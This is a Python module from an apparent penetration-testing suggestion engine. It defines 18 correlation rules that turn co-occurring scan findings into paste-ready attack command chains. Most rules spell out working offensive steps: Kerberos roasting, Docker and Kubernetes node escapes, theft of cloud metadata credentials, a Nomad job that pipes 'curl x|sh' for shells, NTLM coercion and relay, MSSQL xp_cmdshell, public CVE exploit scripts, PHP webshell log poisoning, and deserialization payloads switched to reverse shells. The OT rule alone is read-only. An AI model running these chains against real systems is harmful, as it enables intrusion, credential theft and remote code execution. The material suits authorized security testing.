"""Cross-service chain-correlation rules for the suggestion engine.

Extracted from ``scan.py`` so the 18-entry catalog + its factory live in one
place instead of half a scan-route module.  ``scan.py`` re-imports
``CHAIN_RULE_CALLABLES`` (and re-exports ``_CHAIN_RULES`` as a pass-through
alias) so nothing at the callsite or in the tests changes shape.

Each entry names a set of finding kinds (matched against ``Vuln.script_id``)
that, when co-present in the engagement, unlock a multi-step attack path a
tester should run as one unit.  A rule fires when any one of its triggers
appears in the store; the resulting suggestion carries the paste-ready
command chain plus a rationale.  The ``severity`` field ("critical"/"high")
is preserved verbatim on the emitted dict — the frontend renders it as the
card accent — and the existing ``confidence`` field is derived from it so
old consumers keep working.
"""
from __future__ import annotations


_CHAIN_RULES: tuple[dict, ...] = (
    {
        "name": "chain_ad_kerberos",
        "severity": "critical",
        "triggers": frozenset({
            "ldap_anon_bind", "ldap_rootdse", "ldap_anon_read", "asrep_roast",
            "kerberos_spray_success", "mssql_kerberoastable_spn",
            "ldap_laps_readable", "ldap_rbcd",
        }),
        "suggestion": (
            "Pull the full user set from LDAP anon-read (ldapsearch -x -H "
            "ldap://<dc> -b <rootDSE-namingContext> '(objectClass=user)' "
            "sAMAccountName userPrincipalName servicePrincipalName memberOf), "
            "feed sAMAccountNames to GetNPUsers.py <domain>/ -usersfile users.txt "
            "-no-pass -dc-ip <dc> -format hashcat for AS-REP roast, then "
            "GetUserSPNs.py <domain>/<sprayed_user>:<pw> -dc-ip <dc> -request "
            "for Kerberoast; crack with hashcat -m 18200/-m 13100 -w3 "
            "wordlists/*.txt --rules-file rules/OneRuleToRuleThemAll.rule. If "
            "ldap_laps_readable fired, dump ms-Mcs-AdmPwd on the same bind for "
            "local-admin creds; if ldap_rbcd fired, prep rbcd.py -delegate-from "
            "<controlled_computer$> -delegate-to <target$> -action write."
        ),
        "rationale": (
            "Combines the AD enum surface with the two hash-yielding Kerberos "
            "preauth flaws and the SQL SPN roast into one crack-first-then-"
            "lateral runbook — the canonical initial-foothold-to-DA path an "
            "internal engagement always executes."
        ),
    },
    {
        "name": "chain_smb_post_null_loot",
        "severity": "high",
        "triggers": frozenset({
            "null_session", "readable_share", "writable_share", "guest_enabled",
            "smb_ntlm_info_disclosure",
        }),
        "suggestion": (
            "Enumerate every share and its ACL from the null/guest session: "
            "enum4linux-ng -A -u '' -p '' <host> and nxc smb <host> -u '' -p '' "
            "--shares --users --groups --pass-pol. For each readable share: "
            "smbclient //<host>/<share> -N -c 'recurse ON; prompt OFF; mget *' "
            "into loot/, then run manspider <host> -u '' -p '' -d . -e docx "
            "xlsx pdf ps1 config kdbx -f "
            "'password|passwd|secret|api[_-]?key|conn(ection)?string'. If "
            "writable_share fired on a user-traversed share (NETLOGON/Profiles/"
            "Homes are ideal), drop an SCF or LNK icon-fetch payload "
            "(@ntlmrelayx capture) to coerce authentication and pipe the "
            "hashes into the existing relay/crack pipeline."
        ),
        "rationale": (
            "Null/guest access without immediate loot triage wastes the "
            "finding; combining the read + write + guest kinds tells the "
            "tester exactly which shares to scrape and where to plant a "
            "coercion primitive that feeds the already-wired relay chain."
        ),
    },
    {
        "name": "chain_cloud_metadata_pivot",
        "severity": "critical",
        "triggers": frozenset({
            "web_ssrf_reaches_imds_credentials", "imds_reachable_via_proxy",
            "imds_reachable_from_host", "imds_iam_credentials_exposed",
            "azure_managed_identity_token_exposed",
            "gcp_service_account_token_exposed",
            "alibaba_ram_credentials_exposed", "imds_v1_enabled",
            "imds_user_data_secrets", "instance_identity_disclosed",
        }),
        "suggestion": (
            "Exfil the temp creds first: for AWS, curl -s "
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
            "<role> (through the SSRF/proxy) and export "
            "AWS_ACCESS_KEY_ID/SECRET/SESSION_TOKEN, then aws sts "
            "get-caller-identity && aws iam list-attached-role-policies "
            "--role-name <role> && enumerate-iam / ScoutSuite / Pacu "
            "(import_keys, then run iam__enum_permissions,iam__privesc_scan). "
            "For Azure MI: curl 'http://169.254.169.254/metadata/identity/"
            "oauth2/token?api-version=2018-02-01&resource=https://"
            "management.azure.com/' -H 'Metadata:true' and az login --identity "
            "or ROADrecon auth --access-token <jwt>. For GCP: TOKEN=$(curl -H "
            "'Metadata-Flavor: Google' 169.254.169.254/computeMetadata/v1/"
            "instance/service-accounts/default/token | jq -r .access_token); "
            "gcloud auth activate-refresh-token or hand to GCPBucketBrute/"
            "gcp_scanner. Also grab user-data (may hold bootstrap secrets) "
            "and instance-identity signed doc for lateral trust proofs."
        ),
        "rationale": (
            "SSRF-to-IMDS is only useful if the tester immediately turns the "
            "ephemeral token into a cloud-plane enumeration; the chain names "
            "the exact provider path so the finding becomes a role-assume + "
            "privesc scan instead of a screenshot."
        ),
    },
    {
        "name": "chain_container_orchestrator_escape",
        "severity": "critical",
        "triggers": frozenset({
            "docker_api", "docker_host_escape", "docker_runc_cve",
            "docker_engine_cve", "kubelet_anon", "kubelet_exec", "kubelet_ro",
            "kubelet_logs_dir", "k8s_escape_pods", "dockerreg_anonymous_catalog",
            "dockerreg_manifest_readable", "docker_env_secrets",
            "docker_secrets", "docker_swarm_secrets", "docker_volumes",
        }),
        "suggestion": (
            "If docker_api is exposed: docker -H tcp://<host>:2375 run --rm "
            "-it --privileged --pid=host --net=host -v /:/host alpine chroot "
            "/host sh (instant node-root). Kubelet anon: curl -sk "
            "https://<node>:10250/pods | jq '.items[].metadata.name' then "
            "curl -sk 'https://<node>:10250/exec/<ns>/<pod>/<container>?"
            "command=sh&input=1&output=1&tty=1' via kubeletctl exec "
            "--all-pods sh. Registry: curl -s http://<reg>:5000/v2/_catalog "
            "then docker pull <reg>/<img>:<tag> && dive <img> / trufflehog "
            "docker --image <img> to scrape baked secrets and .dockerenv "
            "envs. Cross-reference docker_env_secrets/docker_secrets loot for "
            "kubeconfigs; if k8s_escape_pods fired, apply a hostPath:/ mount "
            "pod spec (kubectl --token=<jwt> apply -f evil-pod.yaml) for node "
            "breakout."
        ),
        "rationale": (
            "Container-plane findings only pay off when chained — exposed "
            "API to node-root, then registry pull to secrets to a hostPath "
            "escape pod — and this rule sequences that so the tester doesn't "
            "stop at 'anonymous catalog listed'."
        ),
    },
    {
        "name": "chain_hashicorp_stack_secrets",
        "severity": "critical",
        "triggers": frozenset({
            "vault_dev_mode", "vault_unsealed_no_tls", "vault_uninitialized",
            "vault_authed_mounts", "vault_authed_secret_read",
            "vault_mount_list_open", "vault_raft_snapshot_dump",
            "consul_unauth_read", "consul_kv_secrets", "consul_authed",
            "nomad_unauth_read", "nomad_variables_readable",
            "nomad_job_submit_rce", "nomad_acl_bootstrap_available",
            "nomad_integration_token_leak",
        }),
        "suggestion": (
            "Vault first: VAULT_ADDR=http://<v>:8200 vault status; if "
            "dev_mode/unsealed_no_tls, vault secrets list && for m in $(vault "
            "secrets list -format=json | jq -r 'keys[]'); do vault kv list "
            "-format=json $m; done then vault kv get -format=json <path> for "
            "every leaf; if vault_raft_snapshot_dump, vault operator raft "
            "snapshot save snap.snap && offline-decrypt with vault-raft-tools. "
            "Consul: consul kv export / (or curl -s http://<c>:8500/v1/kv/?"
            "recurse | jq -r '.[]|.Key+\": \"+(.Value|@base64d)') and grep for "
            "aws_/token/pw. Nomad: NOMAD_ADDR=http://<n>:4646 nomad var list "
            "-namespace=* -out=json then, if nomad_job_submit_rce, submit a "
            "raw_exec job (nomad job run rev.hcl with driver=raw_exec "
            "command=/bin/sh args=['-c','curl x|sh']) to land a shell on "
            "every eligible node. If acl_bootstrap_available, nomad acl "
            "bootstrap -> management token -> full-cluster ownership."
        ),
        "rationale": (
            "The HashiCorp stack chains cleanly: Vault/Consul hand over the "
            "secrets, Nomad hands over the compute — miss one and the tester "
            "writes a partial finding; miss the chain and they miss cluster-"
            "wide RCE."
        ),
    },
    {
        "name": "chain_ntlm_username_harvest",
        "severity": "high",
        "triggers": frozenset({
            "ntlm_disclosure", "smb_ntlm_info_disclosure", "rdp_ntlm_info",
            "winrm_ntlm_info", "smtp_auth_ntlm_leak", "pop3_ntlm_info",
            "telnet_ntlm_info_leak", "imap_sasl_mechanisms",
            "webdav_auth_scheme",
        }),
        "suggestion": (
            "Aggregate every disclosed NetBIOS name, DNS domain, DNS computer "
            "name, and forest name across the NTLM-leak kinds (nxc smb "
            "<hosts> --gen-relay-list ntlm.txt; nxc ldap <dc> --users to "
            "cross-reference), then build a spray list: printf '%s\\n' "
            "<domain>\\\\<user> > spray.txt and run nxc smb <dc> -u users.txt "
            "-p 'Winter2025!' --continue-on-success (respect ldap_lockout "
            "thresholds — if that finding is present, cap attempts to "
            "<threshold-1> per user per window). Add a Kerberos pre-auth "
            "timing pass: kerbrute userenum -d <domain> --dc <dc> users.txt "
            "to validate accounts without triggering 4625s."
        ),
        "rationale": (
            "Every leaking protocol independently offers a partial NTLM "
            "tuple; only the union gives a clean domain\\forest\\dnsname "
            "triple, and only that triple makes a spray both accurate and "
            "low-noise."
        ),
    },
    {
        "name": "chain_unauth_datastore_datamine",
        "severity": "high",
        "triggers": frozenset({
            "redis_unauth", "mongo_unauth", "es_unauth", "es_anonymous",
            "couchdb_admin_party", "couchdb_unauth_dbs", "etcd_open",
            "etcd_unauth_read", "memcached_unauth", "memcached_values_readable",
            "cassandra_noauth", "pg_trust_auth", "influxdb_unauth",
            "consul_unauth_read", "zk_dump",
        }),
        "suggestion": (
            "Fan out a single loot-walker per store into "
            "loot/datastores/<host>_<port>/: redis-cli -h <h> --scan | head "
            "-1000 && redis-cli -h <h> --rdb dump.rdb; mongoexport --host "
            "<h> --db <db> --collection <c> --out <c>.json (list first with "
            "mongo <h> --eval 'db.adminCommand({listDatabases:1})'); curl -s "
            "http://<h>:9200/_cat/indices?v && elasticdump --input=http://"
            "<h>:9200/<idx> --output=<idx>.json; curl -s http://<h>:5984/"
            "_all_dbs; etcdctl --endpoints=<h>:2379 get / --prefix "
            "--keys-only | head; memcdump --servers=<h>; cqlsh <h> -e 'DESC "
            "KEYSPACES' then COPY <ks>.<tbl> TO 'out.csv'; psql -h <h> -U "
            "postgres -c '\\l' then pg_dump; influx -host <h> -execute "
            "'SHOW DATABASES'. Grep every dump with trufflehog filesystem "
            "loot/datastores/ --only-verified and gitleaks detect --no-git "
            "--source loot/datastores/ to surface tokens/JWTs/AWS keys for "
            "the cloud-pivot rule."
        ),
        "rationale": (
            "Any single unauth datastore is a medium; the tester's actual "
            "next move is a bulk multi-store scrape into a single greppable "
            "loot tree — this rule gives one paste-ready pass and hands its "
            "output into the credential-pivot rules."
        ),
    },
    {
        "name": "chain_mssql_linked_privesc",
        "severity": "critical",
        "triggers": frozenset({
            "mssql_default_creds", "mssql_impersonation_chain",
            "linked_reachable", "linked_fixed_login", "linked_sysadmin",
            "xp_cmdshell", "mssql_openrowset_read",
            "mssql_external_script_rce", "pg_rce", "mysql_udf_loaded",
            "mysql_file_priv", "impersonation", "sysadmin_creds",
            "trustworthy", "public_role",
        }),
        "suggestion": (
            "Enter with mssqlclient.py <user>:<pw>@<host> -windows-auth (or "
            "default creds), then EXEC sp_linkedservers; and for each: EXEC "
            "('SELECT SYSTEM_USER, IS_SRVROLEMEMBER(''sysadmin'')') AT "
            "[<linked>]; walk the linked_sysadmin edges with PowerUpSQL "
            "Get-SQLServerLinkCrawl -Instance <h> -Verbose -Query 'EXEC "
            "master..xp_cmdshell ''whoami'''. If xp_cmdshell disabled but "
            "impersonation fired, EXECUTE AS LOGIN='sa'; then re-enable via "
            "sp_configure. openrowset_read -> cross-db file reads (SELECT * "
            "FROM OPENROWSET(BULK 'C:\\Users\\<u>\\Desktop\\pw.txt', "
            "SINGLE_CLOB) x;). mssql_external_script_rce -> "
            "sp_execute_external_script @language=N'Python',@script=N'import "
            "os;os.system(\"...\")'. Cross-engine: pg_rce (COPY ... PROGRAM), "
            "mysql_udf_loaded (SELECT sys_exec('...')) — same command-exec "
            "pivot, different vendor."
        ),
        "rationale": (
            "Linked-server + impersonation + xp_cmdshell is the classic "
            "'medium creds -> SYSTEM on unrelated host via trusted link' "
            "path that testers miss when findings are viewed one-server-at-"
            "a-time; this rule sequences the crawl."
        ),
    },
    {
        "name": "chain_coerce_and_relay",
        "severity": "critical",
        "triggers": frozenset({
            "msrpc_coercion", "smb_signing_not_required", "webdav_enabled",
            "webdav_put_rce", "smtp_auth_ntlm_leak", "imap_gssapi_relay",
            "winrm_relay_target", "ldap_cleartext", "ldap_weak_sasl_mech",
        }),
        "suggestion": (
            "Start the relay listener aimed at the highest-value targets: "
            "ntlmrelayx.py -tf relay_targets.txt -smb2support "
            "--delegate-access --escalate-user <controlled_user> -socks (add "
            "--http-port 8080 and -wh <attacker> for WebDAV coercion, "
            "--no-http-server off). Then coerce with the most-supported "
            "primitive available: coercer coerce -t <victim> -l <attacker> "
            "-u <user> -p <pw> (auto-tries PetitPotam/PrinterBug/DFSCoerce/"
            "MS-EFSRPC/MS-RPRN/MS-FSRVP). If ldap_weak_sasl_mech or "
            "ldap_cleartext fired on a DC, add -t ldaps://<dc> for RBCD "
            "write; if winrm_relay_target fired, add -t "
            "http://<winrm>:5985/wsman for remote-command. Track successful "
            "relays in socks list and use proxychains for follow-on."
        ),
        "rationale": (
            "Coercion primitives and unsigned SMB (or unsigned LDAP/HTTP) "
            "are two halves of the same attack; the existing relay-targets "
            "rule only names the target list — this one wires the coercion "
            "side and the multi-transport relay flags."
        ),
    },
    {
        "name": "chain_printer_to_domain_creds",
        "severity": "high",
        "triggers": frozenset({
            "ipp_cups", "ipp_uri_harvest", "ipp_get_jobs", "lpd_queue_open",
            "lpd_queue_leak", "lpd_jetdirect_cve", "webdav_href_leak",
            "cups_admin_open", "cups_admin_auth", "printer_stack_correlation",
            "ipp_printers",
        }),
        "suggestion": (
            "Pull the current queue for LDAP/SMB/Kerberos service tickets "
            "baked into scan-to-file/scan-to-email jobs: ipptool -tv "
            "ipp://<host>/printers/<q> get-jobs.test then curl -s "
            "http://<host>:631/jobs?which_jobs=all | grep -Eo "
            "'(ldap|smb|http|kerberos)://\\S+'. If admin open/authed, "
            "reconfigure LDAP bind to point at your responder: curl -u "
            "<admin>:<pw> -X POST http://<host>:631/admin -d 'OP=set-printer-"
            "options&PRINTER_NAME=<q>&AUTH_INFO_REQUIRED=negotiate' with your "
            "listener up (responder -I <iface> -wF); many devices immediately "
            "re-bind and cough the DA-privilege service account cleartext. "
            "jetdirect/lprng CVEs -> check exploit-db and PJL sh commands "
            "(PRET pret.py <host> pjl)."
        ),
        "rationale": (
            "Printers hold configured LDAP/SMB creds for scan-to-folder — "
            "swapping their bind target to a responder yields cleartext "
            "creds for whatever account was configured, which is often "
            "domain-privileged; a chain no single kind conveys."
        ),
    },
    {
        "name": "chain_ot_ics_process_impact",
        "severity": "high",
        "triggers": frozenset({
            "s7_put_get_enabled", "s7_stop_start_possible",
            "s7_protection_level", "s7_read_var_ok",
            "s7_legacy_password_readout", "modbus_device_id",
            "iec104_control_writable", "iec104_reset_writable",
            "iec104_clock_writable", "iec104_startdt_accepted",
            "dnp3_control_surface", "enip_unauth_stop_cpu", "enip_pccc_read",
            "enip_firmware_upload_capable", "bacnet_unauth_write",
            "bacnet_reinitialize_permitted", "bacnet_dcc_default_password",
            "opcua_anonymous_allowed", "opcua_security_mode_none",
        }),
        "suggestion": (
            "DO NOT execute write/stop/reset commands on production OT "
            "without a written safety window and a plant engineer on-console. "
            "Instead, document impact via read-only proofs: snap7-cli <host> "
            "ReadArea DB 1 0 32 (S7); modbus-cli read <host> h@0 16 "
            "(Modbus); mbtget -r3 -a 0 -n 16 <host>; iec-104-client <host> "
            "--command interrogate (read only, no C_SC/C_DC); opcua-client "
            "-e opc.tcp://<host>:4840 -a browse. Screenshot process values, "
            "log the writable/stop/reinit primitives with the exact PDU that "
            "would trigger them (pcap + decoded), and hand to the client "
            "with a proposed maintenance-window test plan. Never issue a "
            "stop/write/reset command without change control — an ICS "
            "finding is a signed report, not a live exploit."
        ),
        "rationale": (
            "OT write/stop primitives are unambiguous impact evidence, but "
            "the correct engagement action is documented read-only proof + "
            "a witnessed maintenance-window replay — the rule is "
            "deliberately safety-first because a wrong click here injures "
            "people."
        ),
    },
    {
        "name": "chain_esxi_vcenter_takeover",
        "severity": "critical",
        "triggers": frozenset({
            "vsphere_cve_2021_21985", "vsphere_cve_2024_37085",
            "vsphere_sso_domain", "vsphere_local_users",
            "vsphere_sessionmanager_open", "vsphere_valid_creds",
            "vsphere_linked", "vsphere_vami", "slp_esxi_openslp_rce",
            "vsphere_outdated_build", "vsphere_stale_snapshot",
        }),
        "suggestion": (
            "If cve_2021_21985 fired: python3 CVE-2021-21985.py -t "
            "https://<vc> (unauth vRealize plugin RCE -> root shell on the "
            "appliance). If cve_2024_37085 fired: after obtaining any domain "
            "foothold, create AD group 'ESX Admins' and add controlled user "
            "-> immediate host-root on every joined ESXi. openslp_rce "
            "(CVE-2021-21974): curl the OpenSLP payload against <host>:427 "
            "for ring-0 RCE (ESXiArgs family). With vsphere_valid_creds: "
            "govc -u '<u>:<p>@<vc>' -k=true ls / && vm.info -json '*' && "
            "datastore.download <ds> vmx-file /tmp; export a target VM's "
            ".vmdk, mount offline (guestmount / libguestfs / kpartx), grab "
            "SAM/NTDS or /etc/shadow with no EDR in-path. vsphere_linked -> "
            "repeat against every linked-mode vCenter; vsphere_stale_snapshot "
            "-> snapshot revert as a post-exploitation persistence primitive."
        ),
        "rationale": (
            "vCenter/ESXi is the most efficient DA-equivalent in a "
            "virtualized shop — offline .vmdk mount defeats EDR and yields "
            "NTDS or shadow directly; the chain lists the four unauth RCEs "
            "and the credentialed path in the order a red-teamer actually "
            "tries them."
        ),
    },
    {
        "name": "chain_dns_forest_map",
        "severity": "high",
        "triggers": frozenset({
            "dns_axfr", "dns_ad_srv", "ldap_anon_bind", "ldap_rootdse",
            "dns_nsec_walk",
        }),
        "suggestion": (
            "Merge AXFR + SRV + LDAP rootDSE outputs into one forest map: "
            "dig @<dns> <domain> AXFR > axfr.txt; dig @<dns> "
            "_ldap._tcp.dc._msdcs.<domain> SRV; dig @<dns> "
            "_kerberos._tcp.<domain> SRV; ldapsearch -x -H ldap://<dc> -s "
            "base namingContexts defaultNamingContext "
            "configurationNamingContext schemaNamingContext "
            "rootDomainNamingContext > rootdse.txt. Cross-reference into a "
            "single forest.md with sites, subnets, GC servers, and trust "
            "relationships (ldapsearch -x -b 'CN=System,<basedn>' "
            "'(objectClass=trustedDomain)'). Feeds every downstream AD rule "
            "with an accurate namingContext + DC list."
        ),
        "rationale": (
            "AXFR alone gives records; LDAP rootDSE alone gives "
            "namingContexts — the merged forest map is what BloodHound + "
            "subsequent AD rules assume exists."
        ),
    },
    {
        "name": "chain_java_rmi_jmx_deser",
        "severity": "critical",
        "triggers": frozenset({
            "jmx_rmi_open", "rmi_registry_open", "java_serialization_endpoint",
            "jenkins_jnlp", "jnlp_reachable", "jnlp_cli2_deser_rce",
            "weblogic_t3_open", "websphere_iiop_open",
        }),
        "suggestion": (
            "For plain RMI/JMX: nmap --script rmi-dumpregistry -p <port> "
            "<host> to list bound objects, then ysoserial "
            "CommonsCollections6 'curl <listener>' | msfconsole -q -x 'use "
            "exploit/multi/misc/java_rmi_server; set RHOSTS <host>; set "
            "RPORT <port>; run' (or python3 jmxploit.py -t <host> -p <port> "
            "-c 'id'). For JNLP/Jenkins CLI: java -jar exploit.jar <host> "
            "<port> 'id' (CVE-2017-1000353 or the newer CVE-2024-43044 "
            "depending on version). For WebLogic T3: python3 "
            "CVE-2020-2555.py <host> <port>. For WebSphere IIOP: ysoserial "
            "with CORBA payload. In every case: verify with `curl` from a "
            "distinctive path first, then swap payload to reverse shell."
        ),
        "rationale": (
            "Java-serialization RCEs are the fastest unauth-to-shell path "
            "on many enterprise stacks; the trigger set covers the four "
            "common exposure surfaces so the tester sees one rule "
            "regardless of which family they hit."
        ),
    },
    {
        "name": "chain_snmp_write_reconfig",
        "severity": "critical",
        "triggers": frozenset({
            "snmp_write_community", "snmp_default_community",
            "snmp_v1v2_community", "snmp_cmdline_creds", "snmp_routes",
        }),
        "suggestion": (
            "If write community found: snmpset -v2c -c <rw> <host> "
            "sysContact.0 s 'test' && snmpget -v2c -c <rw> <host> "
            "sysContact.0 (read-back proves write). Enumerate reconfig "
            "surface: snmpwalk -v2c -c <rw> <host> 1.3.6.1.2.1.4.21 "
            "(routing table), 1.3.6.1.2.1.14 (OSPF), 1.3.6.1.4.1.9.9.87 "
            "(Cisco config-copy MIB — can pull running-config to a TFTP "
            "listener you control: snmpset write to ccCopyEntry). For "
            "Cisco: snmp-config-copy.py -t <host> -c <rw> -s tftp -a "
            "<listener> -f running-config. For Juniper/Aruba/HP: analogous "
            "vendor-config MIB. If snmp_cmdline_creds fired, prioritize "
            "hosts running credful services for the reconfig target "
            "(attacker-defined route or ACL to reach isolated segments). "
            "READ-ONLY proof first (sysDescr write-back), then written "
            "client authorization before any routing/config change."
        ),
        "rationale": (
            "Write community + Cisco config-copy MIB is a full-config-"
            "exfil primitive that most testers know exists but few actually "
            "chain — this rule pastes the exact TFTP-pull sequence."
        ),
    },
    {
        "name": "chain_sip_rtp_eavesdrop",
        "severity": "high",
        "triggers": frozenset({
            "sip_options_open", "sip_register_realm_leak",
            "sip_default_creds", "sip_user_enum", "rtp_streams_visible",
            "sip_no_tls",
        }),
        "suggestion": (
            "Passive first: sngrep -I <iface> or wireshark filter 'sip' "
            "for the SIP signalling, and 'rtp' for the media. For active "
            "enum: svmap.py <host>; svwar.py -e100-200 -m INVITE <host> "
            "(finds live extensions); svcrack.py -u <ext> -d passwords.txt "
            "<host> (if sip_register_realm_leak fired, use the captured "
            "realm to filter Auth). Once one valid extension: baresip -f "
            "config -a account (REGISTER as that ext, receive calls). "
            "Capture live calls: rtpbreak -i <iface> -r target.pcap; then "
            "convert with sox rtp.raw call.wav or use rtpinsertsound / "
            "rtpmixsound for active-injection tests (get written "
            "authorization first — voice manipulation is a felony in many "
            "jurisdictions)."
        ),
        "rationale": (
            "SIP+RTP chains rarely make it into pentest reports because "
            "the tester doesn't know to bring sngrep + rtpbreak + baresip "
            "together; this rule lists the exact toolchain."
        ),
    },
    {
        "name": "chain_k8s_token_to_rbac_privesc",
        "severity": "critical",
        "triggers": frozenset({
            "kubelet_anon", "kubelet_exec", "k8s_escape_pods",
            "k8s_webhook_disclosure", "imds_iam_credentials_exposed",
            "docker_env_secrets", "docker_secrets",
        }),
        "suggestion": (
            "Harvest tokens from every accessible pod: for each pod on "
            "kubelet_anon nodes, curl -sk "
            "https://<node>:10250/exec/<ns>/<pod>/<container>?command=cat"
            "&args=/var/run/secrets/kubernetes.io/serviceaccount/token (or "
            "exec cat directly). For every token: TOKEN=<jwt>; kubectl "
            "--token=$TOKEN --server=https://<api>:6443 auth can-i --list "
            "-A > perms_$sa.txt and grep for '*.*' (cluster-admin), 'get "
            "secrets', 'create pods', 'patch rolebindings', 'escalate "
            "roles', 'bind roles'. Escalation paths: (a) 'create pods' + "
            "hostPath mount = node-root; (b) 'patch/update rolebindings' = "
            "cluster-admin write; (c) 'create tokenrequests' on privileged "
            "SA = impersonation; (d) if k8s_webhook_disclosure showed "
            "failurePolicy=Ignore, kubectl apply -f evil.yaml can bypass a "
            "webhook that's supposed to block it. Cross-reference "
            "imds_iam_credentials_exposed for the AWS IRSA path — kubectl "
            "exec on a pod with an IRSA-annotated SA yields its AWS temp "
            "creds via env inspection."
        ),
        "rationale": (
            "Kubelet-anon alone yields token dumps; token dumps alone "
            "yield permission lists; only the chain yields the actual "
            "privesc path — and the failurePolicy=Ignore bypass from "
            "k8s_webhook_disclosure is easy to miss without this "
            "correlation."
        ),
    },
    {
        "name": "chain_http_lfi_to_rce",
        "severity": "critical",
        "triggers": frozenset({
            "http_lfi", "http_rfi", "http_path_traversal",
            "http_upload_endpoint", "http_ssrf", "http_deserialization",
            "webdav_put_rce",
        }),
        "suggestion": (
            "Confirm LFI depth: curl "
            "'http://<host>/vuln?f=../../../../../../../etc/passwd' or "
            "wrap in php://filter (curl 'http://<host>/vuln?f=php://filter"
            "/convert.base64-encode/resource=index.php') to read source. "
            "LFI-to-RCE bridges: (a) if PHP session files readable, poison "
            "via User-Agent then include /tmp/sess_<id>; (b) "
            "/proc/self/environ include with HTTP_USER_AGENT: '<?php "
            "system($_GET[c]); ?>'; (c) log-poisoning: send crafted URI "
            "containing PHP, then include /var/log/apache2/access.log; (d) "
            "SMB share include on Windows: curl "
            "'http://<host>/vuln?f=\\\\\\\\<attacker>\\\\share\\\\shell.php' "
            "(needs SMB signing disabled — cross-check "
            "smb_signing_not_required). If http_upload_endpoint fired, "
            "jump straight to upload + LFI-include the uploaded file. "
            "WebDAV PUT RCE = curl -T shell.aspx -u <user>:<pw> "
            "http://<host>/webdav/, then browse to /webdav/shell.aspx. "
            "Deserialization (Java/PHP/.NET) -> ysoserial/phpggc/"
            "ysoserial.net respectively."
        ),
        "rationale": (
            "LFI-alone is medium; LFI + a wrapper + a log or session-"
            "poison path is unauth RCE — the chain names all four bridges "
            "plus the WebDAV shortcut so the tester doesn't stop at "
            "\"file read\"."
        ),
    },
)


def _make_chain_rule(spec: dict):
    """Build a callable rule from a chain spec.

    Fires when any host in the engagement carries a Vuln whose script_id
    matches one of the spec's triggers. Emits a single suggestion dict of
    the same shape the other rules emit, with the `severity` string carried
    through verbatim and `confidence` derived from it ("critical" -> "high",
    "high" -> "medium") so the existing frontend still ranks the card.
    """
    triggers: frozenset[str] = spec["triggers"]
    sev: str = spec["severity"]
    conf = "high" if sev == "critical" else "medium"
    src = spec["name"]
    suggestion = spec["suggestion"]
    rationale = spec["rationale"]

    def _rule(hosts, creds, loot_dir):  # noqa: ARG001
        hits: list[str] = []
        for h in hosts or []:
            for v in (getattr(h, "vulns", None) or []):
                sid = (getattr(v, "script_id", "") or "").lower()
                if sid in triggers:
                    hits.append(sid)
        if not hits:
            return []
        kinds = sorted(set(hits))
        key_hint = ",".join(kinds[:4])
        return [{
            "key": f"{src}-{key_hint}",
            "command": "", "field": "", "suggested_value": "",
            "external_cmd": suggestion,
            "reason": rationale,
            "severity": sev,
            "confidence": conf,
            "source": src,
        }]

    _rule.__name__ = "_rule_" + src.removeprefix("chain_")
    _rule.__doc__ = f"Chain rule: {src} (severity={sev}). {rationale}"
    return _rule


# Materialise one callable per chain spec, in declaration order.  Exported
# so ``scan.py`` can splice these onto the end of ``_SUGGESTION_RULES`` with
# a single ``extend`` — no per-rule wiring in the route module.
CHAIN_RULE_CALLABLES = [_make_chain_rule(spec) for spec in _CHAIN_RULES]
